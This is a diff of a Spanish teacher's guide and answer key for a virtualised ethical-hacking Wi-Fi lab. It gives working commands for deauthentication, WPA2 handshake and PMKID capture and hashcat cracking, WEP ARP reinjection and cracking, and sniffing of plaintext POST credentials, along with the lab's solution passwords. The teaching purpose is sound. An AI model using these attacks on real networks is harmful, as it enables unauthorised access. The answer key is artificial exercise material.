@@ -1,4 +1,8 @@
-# Guía de Laboratorio Wi-Fi — Hacking Ético
+# Guía del profesor — Laboratorio Wi-Fi (Hacking Ético)
+
+> **DOCUMENTO SOLO PARA EL PROFESOR.** Contiene las claves y la resolución
+> completa de cada escenario. No lo repartas al alumnado: ellos tienen
+> `guia_alumno.md`.
 
 > **Entorno 100 % virtualizado.** Todas las radios son simuladas con
 > `mac80211_hwsim` y aisladas en *network namespaces*. No hay emisión por
@@ -15,9 +19,13 @@
 sudo ./despliegue.sh
 ```
 
-Al terminar, el script imprime un cuadro con el **SSID, canal, BSSID real y
-clave/usuario** de cada escenario. Apunta esos BSSID: cambian en cada
-despliegue. Las interfaces de trabajo del alumno son **`wlan0` … `wlan6`**.
+El script instala lo que falte (`hostapd`, `hcxtools`, `pocl-opencl-icd`,
+`ocl-icd-libopencl1`), levanta los 6 escenarios y, al terminar, imprime el
+**SSID, canal y BSSID real** de cada uno (las claves no se muestran). Los BSSID
+cambian en cada despliegue. Las interfaces de trabajo del alumno son
+**`wlan0` … `wlan6`**.
+
+Para desmontarlo todo: `sudo ./limpia.sh`.
 
 ### Poner una interfaz en modo monitor
 
@@ -40,16 +48,20 @@ sudo iw dev wlan0 set channel 11
 
 ---
 
-## Resumen de escenarios
+## Soluciones
 
-| SSID            | Ch | Seguridad   | Objetivo didáctico                         | Clave / credencial |
-|-----------------|----|-------------|--------------------------------------------|--------------------|
-| `he_open`       | 1  | Abierta     | Sniffing de tráfico en claro (HTTP POST)   | —                  |
-| `he_wpa2`       | 6  | WPA2-PSK    | Captura del handshake 4-way + crackeo      | `dragonfly`        |
-| `he_pmkid`      | 11 | WPA2-PSK    | PMKID **con** clientes asociados           | `chocolate`        |
-| `he_pmkid_nc`   | 4  | WPA2-PSK    | PMKID **sin** clientes (*clientless*)      | `marshmallow`      |
-| `he_enterprise` | 3  | WPA2-EAP    | EAP-PEAP / captura de reto MSCHAPv2        | `student_user@domain.lab` |
-| `he_wep`        | 9  | WEP-128     | Recolección de IVs + reinyección ARP       | `12345678901234567890123456` |
+| SSID            | Ch | Seguridad   | Objetivo didáctico                         | Solución |
+|-----------------|----|-------------|--------------------------------------------|----------|
+| `he_open`       | 1  | Abierta     | Sniffing de tráfico en claro (HTTP POST)   | `user=admin&pass=SecretPass2026` |
+| `he_wpa2`       | 6  | WPA2-PSK    | Captura del handshake 4-way + crackeo      | `chocolate` |
+| `he_pmkid`      | 11 | WPA2-PSK    | PMKID **con** clientes asociados           | `dragonfly` |
+| `he_pmkid_nc`   | 4  | WPA2-PSK    | PMKID **sin** clientes (*clientless*)      | `marshmallow` |
+| `he_enterprise` | 3  | WPA2-EAP    | EAP-PEAP / captura de reto MSCHAPv2        | Identidad `student_user@domain.lab` · tipo EAP 25 (PEAP) |
+| `he_wep`        | 9  | WEP-104     | Recolección de IVs + reinyección ARP       | `ilovemyfamily` (hex `69:6C:6F:76:65:6D:79:66:61:6D:69:6C:79`) |
+
+Las tres claves WPA2 están en `rockyou.txt`. El password interno del cliente
+Enterprise (`EnterprisePass2026`) **no** es un objetivo de la práctica: el
+alumno solo debe identificar la identidad en claro y el método EAP.
 
 ---
 
@@ -65,11 +77,15 @@ sudo airodump-ng -c 1 --bssid <BSSID_OPEN> -w cap_open wlan0
 tshark -r cap_open-01.cap -Y 'http.request.method == "POST"' -T fields -e http.file_data
 ```
 
-**Aprendizaje:** cualquiera en la misma red abierta ve el `user=admin&pass=...`.
+**Resultado esperado:** `user=admin&pass=SecretPass2026`.
+
+**Aprendizaje:** cualquiera en la misma red abierta ve las credenciales.
 
 ---
 
 ## 2. `he_wpa2` — Handshake 4-way + crackeo offline
+
+Hay dos clientes asociados.
 
 ### a) Capturar el handshake
 
@@ -81,7 +97,8 @@ sudo airodump-ng -c 6 --bssid <BSSID_WPA2> -w cap_wpa2 wlan0
 ### b) Forzar reconexión con un deauth (desde otra terminal)
 
 ```bash
-# Deauth dirigido al cliente para capturar el handshake al reconectar
+sudo iw dev wlan1 set type monitor && sudo ip link set wlan1 up
+sudo iw dev wlan1 set channel 6
 sudo aireplay-ng -0 3 -a <BSSID_WPA2> wlan1
 ```
 
@@ -98,7 +115,7 @@ hcxpcapngtool -o hash_wpa2.22000 cap_wpa2-01.cap
 hashcat -m 22000 hash_wpa2.22000 /usr/share/wordlists/rockyou.txt
 ```
 
-> La clave `dragonfly` está en rockyou, así que el crackeo es rápido.
+**Resultado esperado:** `chocolate`.
 
 ---
 
@@ -121,7 +138,7 @@ hcxpcapngtool -o hash_pmkid.22000 pmkid_cli.pcapng
 hashcat -m 22000 hash_pmkid.22000 /usr/share/wordlists/rockyou.txt
 ```
 
-> La clave `chocolate` también está en rockyou.
+**Resultado esperado:** `dragonfly`.
 
 ---
 
@@ -129,8 +146,8 @@ hashcat -m 22000 hash_pmkid.22000 /usr/share/wordlists/rockyou.txt
 
 No hay ninguna estación asociada **a propósito**. Es el caso que demuestra por
 qué el PMKID es peligroso: el AP incluye el PMKID en el **primer mensaje (M1)**
-del RSN durante la asociación, así que **no necesitas ningún cliente** — basta
-con provocar tú mismo la asociación para que el AP emita ese M1.
+del 4-way durante la asociación, así que **no hace falta ningún cliente**:
+basta con provocar uno mismo la asociación para que el AP emita ese M1.
 
 ```bash
 sudo iw dev wlan0 set channel 4
@@ -144,7 +161,9 @@ hcxpcapngtool -o hash_nc.22000 pmkid_nc.pcapng
 hashcat -m 22000 hash_nc.22000 /usr/share/wordlists/rockyou.txt
 ```
 
-**Comparación clave para el alumno:**
+**Resultado esperado:** `marshmallow`.
+
+**Comparación (respuesta a la pregunta de la guía del alumno):**
 
 | | `he_pmkid` | `he_pmkid_nc` |
 |---|---|---|
@@ -153,7 +172,9 @@ hashcat -m 22000 hash_nc.22000 /usr/share/wordlists/rockyou.txt
 | Material obtenible | PMKID **y** handshake | Solo PMKID |
 | Lección | Dos vías de ataque | El PMKID no depende de clientes |
 
-> La clave `marshmallow` está en rockyou.
+Fórmula: `PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)`. Como
+depende de la MAC del atacante y no de la de un cliente legítimo, cualquiera
+puede obtenerlo asociándose.
 
 ---
 
@@ -166,12 +187,15 @@ sudo airodump-ng -c 3 --bssid <BSSID_ENT> -w cap_ent wlan0
 
 Objetivo: observar el intercambio EAP-PEAP y comentar el vector de **Evil Twin /
 RADIUS falso** (`hostapd-wpe`) para capturar el challenge/response MSCHAPv2 y
-crackearlo con `asleap`. En este laboratorio basta con identificar el tipo de
-EAP en la captura:
+crackearlo con `asleap`. En este laboratorio basta con identificar la identidad
+y el tipo de EAP en la captura:
 
 ```bash
-tshark -r cap_ent-01.cap -Y eap -T fields -e eap.type
+tshark -r cap_ent-01.cap -Y eap -T fields -e eap.identity -e eap.type
 ```
+
+**Resultado esperado:** identidad `student_user@domain.lab` (viaja en claro en
+la fase externa) y tipo EAP 25 = PEAP.
 
 ---
 
@@ -185,12 +209,40 @@ sudo iw dev wlan0 set channel 9
 # Capturar IVs
 sudo airodump-ng -c 9 --bssid <BSSID_WEP> -w cap_wep wlan0
 
-# Reinyección ARP para acelerar la generación de IVs (otra terminal)
+# Reinyección ARP para acelerar la generación de IVs (otra terminal, wlan1 en
+# monitor y en el canal 9)
 sudo aireplay-ng -3 -b <BSSID_WEP> wlan1
 
 # Crackear en cuanto haya ~20.000-40.000 IVs
 aircrack-ng cap_wep-01.cap
 ```
+
+**Resultado esperado:** `KEY FOUND! [ 69:6C:6F:76:65:6D:79:66:61:6D:69:6C:79 ] (ASCII: ilovemyfamily)`.
+
+El ataque PTW de aircrack es estadístico, no de diccionario: la clave se
+recupera sea cual sea.
+
+---
+
+## Mantenimiento: cambiar las claves
+
+- **WPA2:** las claves se guardan como PMK (64 hex) en `despliegue.sh`, en el
+  `hostapd.conf` y en el `wpa.conf` de cada escenario. La PMK depende del SSID,
+  así que se calcula para cada red:
+
+  ```bash
+  ./calculaPMK.py he_wpa2 <nueva_clave>
+  ```
+
+  Usa palabras de `rockyou.txt` de 8 a 63 caracteres.
+
+- **WEP:** `wep_key0` en hex. Solo admite 5 o 13 caracteres ASCII (10 o 26 hex):
+
+  ```bash
+  printf 'ilovemyfamily' | od -An -tx1 | tr -d ' \n'
+  ```
+
+Tras cambiar una clave, actualiza la tabla de soluciones de esta guía.
 
 ---
 
@@ -202,9 +254,7 @@ ip netns list
 sudo ip netns exec ns_ap_pmkid_nc iw dev
 
 # Apagar todo el laboratorio
-sudo pkill -9 hostapd wpa_supplicant
-for ns in $(ip netns list | awk '/^ns_/{print $1}'); do sudo ip netns del "$ns"; done
-sudo modprobe -r mac80211_hwsim
+sudo ./limpia.sh
 ```
 
 ---
@@ -213,8 +263,5 @@ sudo modprobe -r mac80211_hwsim
 
 - **aircrack-ng suite** (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)
 - **hcxdumptool / hcxpcapngtool** (captura y conversión de PMKID/handshake)
-- **hashcat** (modo `22000` = WPA-PBKDF2-PMKID+EAPOL)
+- **hashcat** (modo `22000` = WPA-PBKDF2-PMKID+EAPOL), en CPU mediante PoCL
 - **tshark** (análisis de capturas)
-
-> Diccionario de referencia: `rockyou.txt`. Todas las claves de los escenarios
-> WPA2 están incluidas en él para que las prácticas sean reproducibles en clase.
